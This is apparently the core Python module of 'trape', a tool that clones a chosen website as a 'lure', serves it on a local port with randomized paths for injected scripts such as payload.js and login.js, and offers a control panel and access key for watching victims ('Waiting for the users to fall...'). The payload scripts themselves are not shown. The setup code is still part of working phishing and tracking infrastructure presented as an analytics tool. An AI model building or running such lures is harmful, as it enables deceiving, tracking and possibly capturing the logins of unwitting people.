#!/usr/bin/env python
# -*- coding: utf-8 -*-
#**
#
#########
# trape #
#########
#
# trape depends of this file
# For full copyright information this visit: https://github.com/jofpin/trape
#
# Copyright 2018 by Jose Pino (@jofpin) / <jofpin@gmail.com>
#**
import time
import json
import urllib
from core.dependence import urllib2
import argparse
import socket
import sys
import os
from core.utils import utils
import subprocess
import hashlib, binascii
from threading import Timer
from multiprocessing import Process
import atexit

class Trape(object):
	def __init__(self, stat = 0):
		self.name_trape = "Trape"
		self.version = "2.1"
		self.stats_path = utils.generateToken(10)
		self.home_path = utils.generateToken(18)
		self.logout_path = utils.generateToken(6)
		self.remove_path = utils.generateToken(14)
		self.injectURL = utils.generateToken(12) + '.js'
		self.stats_key = utils.generateToken(24)
		self.date_start = time.strftime("%Y-%m-%d - %H:%M:%S")
		self.stat = stat
		self.localIp = '127.0.0.1'

		self.JSFiles = ({"path" : "base.js", "src" : utils.generateToken(12)},{"path" : "libs.min.js", "src" : utils.generateToken(12)},{"path" : "login.js", "src" : utils.generateToken(12)},{"path" : "payload.js", "src" : utils.generateToken(12)},{"path" : "trape.js", "src" : utils.generateToken(12)},{"path" : "vscript.js", "src" : utils.generateToken(12)},{"path" : "custom.js", "src" : utils.generateToken(12)},{"path" : "leaflet.min.js", "src" : utils.generateToken(12)},)
		self.CSSFiles = ({"path" : "/static/img/favicon.ico", "src" : utils.generateToken(12)},{"path" : "/static/img/favicon.png", "src" : utils.generateToken(12)},{"path" : "/static/css/base-icons.css", "src" : utils.generateToken(12)},{"path" : "/static/css/styles.css", "src" : utils.generateToken(12)},{"path" : "/static/css/normalize.min.css", "src" : utils.generateToken(12)},{"path": "/static/css/services-icons.css", "src" : utils.generateToken(12)},{"path": "/static/css/leaflet.css", "src" : utils.generateToken(12)},)

		if self.stat == 1:
			try:
				s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
				s.settimeout(5)
				s.connect(("1.1.1.1", 53))
				s.close()
			except Exception as e:
				try:
					s.close()
				except Exception:
					pass
				utils.Go("\033[H\033[J")
				utils.Go(utils.Color['whiteBold'] + "[" + utils.Color['redBold'] + "x" + utils.Color['whiteBold'] + "]" + utils.Color['redBold'] + " " + "NOTICE: " + utils.Color['white'] + "Trape needs Internet connection for working" + "\n\t")
				sys.exit(0)

			if (not(os.path.exists("trape.config"))):
			 	self.trape_config()
			try:
				config_trape = json.load(open("trape.config"))
			except Exception as error:
				os.remove('trape.config')
				self.trape_config()
				config_trape = json.load(open("trape.config"))

			geoip_db = config_trape.get('geoip_db_path', 'GeoLite2-City.mmdb')
			os.environ['GEOIP_DB_PATH'] = geoip_db

			parser = argparse.ArgumentParser("python3 trape.py -u <<Url>> -p <<Port>>")
			parser.add_argument('-u', '--url', dest='url', help='Put the web page url to clone')
			parser.add_argument('-p', '--port', dest='port', help='Insert your port')
			parser.add_argument('-ak', '--accesskey', dest='accesskey', help='Insert your custom key access')
			parser.add_argument('-l', '--local', dest='local', help='Insert your home file')
			parser.add_argument('-ic', '--injectcode', dest='injc', help='Insert your custom REST API path')
			parser.add_argument('-ud', '--update', dest='update', action='store_true', default=False, help='Update trape to the latest version')

			options = parser.parse_args()

			self.type_lure = 'global'

			# Check current updates

			if options.update:
				utils.Go("\033[H\033[J")
				utils.Go("Updating..." + " " + utils.Color['blue'] + "trape" + utils.Color['white'] + "..." + "\n")
				subprocess.check_output(["git", "reset", "--hard", "origin/master"])
				subprocess.check_output(["git", "pull"])
				utils.Go("Trape Updated... Please execute again...")
				sys.exit(0)

			if options.url is None:
				utils.Go("\033[H\033[J")
				utils.Go("----------------------------------------------")
				utils.Go("" + " " + utils.Color['redBold'] + "TRAPE" + utils.Color['white'] +" {" + utils.Color['yellowBold'] + "stable" + utils.Color['white'] + "}" + utils.Color['white'] + " - " + "Osint and analytics tool" + " " + "<" +utils.Color['white'])
				utils.Go("----------------------------------------------")
				utils.Go("| v" + utils.Color['redBold'] + self.version + utils.Color['white'] + " |")
				utils.Go("--------" + "\n")
				utils.Go(utils.Color['whiteBold'] + "[" + utils.Color['greenBold'] + "!" + utils.Color['whiteBold'] + "]" + " " + utils.Color['white'] + "Enter the information requested below to complete the execution" + utils.Color['white'])
				utils.Go("")

				options.url = input(utils.Color['blueBold'] + "-" + utils.Color['white'] + " Enter a URL to generate the lure" + " " + utils.Color['yellow'] + ":~> " + utils.Color['white'])

			if options.port is None:
				options.port = input(utils.Color['blueBold'] + "-" + utils.Color['white'] + " What is your port to generate the server?" + " " + utils.Color['yellow'] + ":~> " + utils.Color['white'])

			while utils.checkPort(int(options.port)) == False:
				utils.Go("\033[H\033[J")
				utils.Go("----------------------------------------------")
				utils.Go("" + " " + utils.Color['redBold'] + "TRAPE" + utils.Color['white'] +" {" + utils.Color['yellowBold'] + "stable" + utils.Color['white'] + "}" + utils.Color['white'] + " - " + "Osint and analytics tool" + " " + "<" +utils.Color['white'])
				utils.Go("----------------------------------------------")
				utils.Go("\n")
				utils.Go(utils.Color['whiteBold'] + "[" + utils.Color['redBold'] + "x" + utils.Color['whiteBold'] + "]" + utils.Color['redBold'] + " " + "ERROR:" + " " + utils.Color['whiteBold'] + "The port: " + options.port + utils.Color['white'] + " " + "is not available, It was previously used (" + utils.Color['yellow'] + "Use another port" + utils.Text['end'] + ")" + "\n\n")
				options.port = input(utils.Color['blueBold'] + "-" + utils.Color['white'] + " What is your port to generate the server?" + " " + utils.Color['yellow'] + ":~> " + utils.Color['white'])

			#while utils.checkUrl(str(options.url)) == False:
				options.url = input(utils.Color['blueBold'] + "-" + utils.Color['white'] + " Enter a URL to generate the lure" + " " + utils.Color['yellow'] + ":~> " + utils.Color['white'])


			utils.Go("")
			utils.Go(utils.Color['greenBold'] + "-" + utils.Color['white'] + " Successful " + utils.Color['greenBold'] + "startup" + utils.Color['white'] + ", get lucky on the way!" + utils.Color['white'])
			utils.Go("")
			time.sleep(0.1)


			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			s.connect(("1.1.1.1", 80))
			self.localIp = s.getsockname()[0]

			self.app_port = int(options.port)
			self.url_to_clone = str(options.url)
			if self.url_to_clone[0:4] != 'http':
				self.url_to_clone = 'http://' + self.url_to_clone
			self.victim_path = options.url.replace("http://", "").replace("https://", "")

			# Custom name of REST API
			if (options.injc):
				self.injectURL = options.injc

			# Custom access token
			if (options.accesskey):
			    self.stats_key = options.accesskey


	# Design principal of the header of trape
	def header(self):
		if self.stat == 1:
			# Principal header of tool
			utils.banner()

			utils.Go(utils.Color['white'] + "\t" + utils.Color['yellowBold'] + "@" + utils.Color['white'] + "-" + utils.Color['blue'] + "=" + utils.Color['white'] + "["  + utils.Color['whiteBold'] + " " + "VERSION:" + " " + utils.Color['greenBold'] + "v" + self.version + utils.Color['white'])
			utils.Go("")

			# Local information vars
			utils.Go(utils.Color['white'] + "\t" + utils.Color['whiteBold'] + "LOCAL INFORMATION" + utils.Text['end'])
			utils.Go("\t" + "-------------------")
			utils.Go(utils.Color['white'] + "\t" + utils.Color['green'] + ">" + utils.Color['white'] + "-" + utils.Color['blue'] + "=" + utils.Color['white'] + "["  + utils.Color['white'] + " Lure for the users: " + utils.Color['blue'] + 'http://' + self.localIp + ':' + str(self.app_port) + '/' + self.victim_path)
			utils.Go(utils.Color['white'] + "\t" + utils.Color['green'] + ">" + utils.Color['white'] + "-" + utils.Color['blue'] + "=" + utils.Color['white'] + "["  + utils.Color['white'] + " Your REST API path: " + utils.Color['blue'] + 'http://' + self.localIp + ':' + str(self.app_port) + '/' + self.injectURL + utils.Color['white'])
			utils.Go(utils.Color['white'] + "\t" + utils.Color['green'] + ">" + utils.Color['white'] + "-" + utils.Color['blue'] + "=" + utils.Color['white'] + "["  + utils.Color['white'] + " Control Panel Link: " + utils.Color['blue'] + "http://127.0.0.1:" + utils.Color['blue'] + str(self.app_port) + '/' + self.stats_path)
			utils.Go(utils.Color['white'] + "\t" + utils.Color['green'] + ">" + utils.Color['white'] + "-" + utils.Color['blue'] + "=" + utils.Color['white'] + "["  + utils.Color['white'] + " Your Access key: " + utils.Color['blue'] + self.stats_key + utils.Color['white'])
			utils.Go("")
			utils.Go("\n" + utils.Color['white'])
			utils.Go(utils.Color['white'] + "[" + utils.Color['greenBold'] + ">" + utils.Color['white'] + "]" + utils.Color['whiteBold'] + " " + "Start time:" + " " + utils.Color['white'] + self.date_start)
			utils.Go(utils.Color['white'] + "[" + utils.Color['greenBold'] + "?" + utils.Color['white'] + "]" + utils.Color['white'] + " " + "Do not forget to close " + self.name_trape + ", after use. Press Control C" + " " + utils.Color['white'] + '\n')
			utils.Go(utils.Color['white'] + "[" + utils.Color['greenBold'] + "¡" + utils.Color['white'] + "]" + utils.Color['white'] + " " + "Waiting for the users to fall..." + "\n")

	# Important: in the process of use is possible that will ask for the root
	def rootConnection(self):
		pass

	# Detect operating system, to compose the compatibility
	def loadCheck(self):
		utils.checkOS()

    # the main file (trape.py)
	def main(self):
		import core.sockets

	# Create config file
	def trape_config(self):
		utils.Go("\033[H\033[J")
		utils.Go("----------------------------------------------------------")
		utils.Go("" + " " + utils.Color['redBold'] + "TRAPE" + utils.Color['white'] +" {" + utils.Color['yellowBold'] + "stable" + utils.Color['white'] + "}" + utils.Color['white'] + " - " + "Configuration zone to use the software" + " " + "<" + utils.Color['white'])
		utils.Go("----------------------------------------------------------")
		utils.Go("| v" + utils.Color['redBold'] + self.version + utils.Color['white'] + " |")
		utils.Go("--------" + "\n")
		utils.Go(utils.Color['whiteBold'] + "GENERAL CONFIG" + utils.Color['white'])
		utils.Go("------")
		utils.Go("Through this section you will configure the resources required \nfor an effective function of trape." + utils.Color['white'])
		utils.Go("")
		utils.Go(utils.Color['whiteBold'] + "GEOIP DATABASE" + utils.Color['white'])
		utils.Go("------")
		utils.Go("Enter the path to your MaxMind GeoLite2-City.mmdb file.\nYou can download it from " + utils.Color['blueBold'] + "https://dev.maxmind.com/geoip/geolite2-free-geolocation-data" + utils.Color['white'] + "\nLeave empty to use the default path (GeoLite2-City.mmdb in the current directory).")
		utils.Go("")
		c_geoip = input(utils.Color['blueBold'] + "-" + utils.Color['white'] + " GeoIP database path (default: GeoLite2-City.mmdb)" + " " + utils.Color['yellow'] + ":~> " + utils.Color['white'])
		if c_geoip == '':
			c_geoip = 'GeoLite2-City.mmdb'
		utils.Go("")
		utils.Go(utils.Color['greenBold'] + "-" + utils.Color['white'] + " Congratulations! " + utils.Color['greenBold'] + "Successful configuration" + utils.Color['white'] + ", now enjoy Trape!" + utils.Color['white'])
		utils.Go("")
		time.sleep(0.4)
		v = json.dumps({"geoip_db_path": c_geoip}, indent=4)
		f = open('trape.config', 'w')
		f.write(v)
		f.close()

	def injectCSS_Paths(self, code):
		code = code.replace("[FAVICON_HREF]", self.CSSFiles[0]['src'])
		code = code.replace("[FAVICON_PNG_HREF]",self.CSSFiles[1]['src'])
		code = code.replace("[BASE_ICONS_HREF]", self.CSSFiles[2]['src'])
		code = code.replace("[STYLES_HREF]", self.CSSFiles[3]['src'])
		code = code.replace("[NORMALIZE_HREF]", self.CSSFiles[4]['src'])
		code = code.replace("[SERVICES_ICONS_HREF]", self.CSSFiles[5]['src'])
		code = code.replace("[LEAFLET_CSS_HREF]", self.CSSFiles[6]['src'])
		return code

# Autocompletion of console
if "nt" in os.name:
	pass
else:
	import readline
	readline.parse_and_bind("tab:complete")
	readline.set_completer(utils.niceShell)
